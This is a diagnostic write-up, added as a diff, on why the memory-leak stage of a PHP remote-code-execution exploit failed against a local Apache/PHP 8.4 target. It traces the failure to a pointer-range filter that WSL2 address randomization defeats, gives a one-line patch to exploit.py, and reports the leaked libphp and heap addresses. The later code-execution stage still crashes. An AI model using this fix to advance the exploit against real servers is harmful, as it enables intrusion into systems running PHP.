@@ -1,0 +1,105 @@
+9bie B1 Set-Cookie leak diagnosis
+=================================
+
+Repository
+  work/php2shell-9bie
+  commit 17e98ee81025cccfd94b4f9c9a17bf269c65ff75
+
+Target used for this diagnostic run
+  image: php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
+  PHP: 8.4.26
+  Apache prefork workers: 1
+  loopback target: 127.0.0.1:18113
+  WSL kernel: Linux 6.6.87.2-microsoft-standard-WSL2 x86_64
+  vm.mmap_rnd_bits: 32
+  vm.mmap_rnd_compat_bits: 8
+
+Original failure
+  exploit.py:parse_leak() accepts a qword only when:
+
+      0x7f0000000000 <= q <= 0x7fffffffffff
+
+  The freshly captured B1 response was:
+
+      HTTP response bytes        1,677,531
+      raw Set-Cookie value bytes 1,677,312
+      decoded bytes              819,208
+      decoded prefix             /14BBBBBAAAAAAAA...
+
+  Scanning every possible qword alignment (0 through 7) with the original
+  0x7f-only predicate found zero pointers. This was not a URL-decoding or
+  qword-alignment failure. The final eight decoded bytes are the cookie
+  attribute "; path=/"; the upstream successful evidence also reports a
+  decoded length of 819,208, so inclusion of that attribute is not causal.
+
+Root cause
+  This WSL2 kernel uses 32 mmap randomization bits. libphp and Zend MM chunks
+  were mapped at 0x7a... and 0x7b..., below the PoC's hard-coded 0x7f lower
+  bound. With the conservative high-user-mapping range
+
+      0x700000000000 <= q < 0x800000000000
+
+  the first captured response produced 8,756 pointer occurrences (6,646
+  unique qwords) at alignment zero. Its values and 2 MiB buckets were:
+
+      0x7ae3e78dfb60 x 1095  (dominant qword, zval_ptr_dtor)
+
+      0x7ae3e4e00000 x 7495  (dominant id-chunk bucket)
+      0x7ae3e7800000 x 1095  (libphp bucket)
+      0x7ae3e5600000 x   87  (main-chunk fingerprint)
+      0x7ae3e4c00000 x   79  (secondary heap bucket)
+
+  Derived addresses:
+
+      zval_ptr_dtor  0x7ae3e78dfb60
+      libphp base    0x7ae3e7281000  (zdtor - 0x65eb60)
+      main chunk     0x7ae3e5600000
+      lib-main delta 0x1c81000       (inside exploit's allowed interval)
+
+  These counts exactly match the upstream successful fingerprint
+  7495 / 1095 / 87 / 79. Therefore the heap layout, stale-id OOB read,
+  response decoding, qword alignment, and main-chunk selection all worked.
+
+Minimum patch
+
+--- a/exploit.py
++++ b/exploit.py
+@@
+-        if 0x7f0000000000 <= q <= 0x7fffffffffff:
++        if 0x700000000000 <= q < 0x800000000000:
+             counts[q] += 1
+
+Validation after applying only that change in a pipe (the repository file was
+not altered during the run):
+
+  decoded=819208 zval_ptr_dtor=0x7b726e3a1b60 -> libphp=0x7b726dd43000
+  chunk buckets:
+    0x7b726ba00000 x 7495
+    0x7b726e200000 x 1095
+    0x7b726c000000 x   87
+    0x7b726b800000 x   79
+
+  /proc/<apache-parent>/maps began libphp.so at exactly 0x7b726dd43000:
+
+    7b726dd43000-7b726de99000 r--p ... /usr/lib/apache2/modules/libphp.so
+    7b726de99000-7b726e3ac000 r-xp ... /usr/lib/apache2/modules/libphp.so
+    7b726e3ac000-7b726eeb2000 r--p ... /usr/lib/apache2/modules/libphp.so
+
+  This independently confirms both the widened pointer filter and the
+  zval_ptr_dtor-to-libphp offset.
+
+Scope of the fix
+  The patch completely fixes the observed B1 parse failure and allows A2/B2
+  to run. In one validation run, the correct 87-count main-chunk candidate
+  reached B2 but the Apache child exited with SIGSEGV and no proof file was
+  created. The secondary 79-count candidate also exited with SIGSEGV.
+  Therefore B1 is solved; the remaining RCE failure is a separate B2 heap
+  placement/calibration issue.
+
+Worker-pinning assessment
+  The diagnostic used a true one-worker prefork target and returned the exact
+  upstream leak fingerprint, proving A1 and B1 ran in the same child. Earlier
+  150-worker runs also reported all 149 holders established. The original
+  "no heap pointers" outcome is thus explained by the address predicate, not
+  by worker pinning.
+
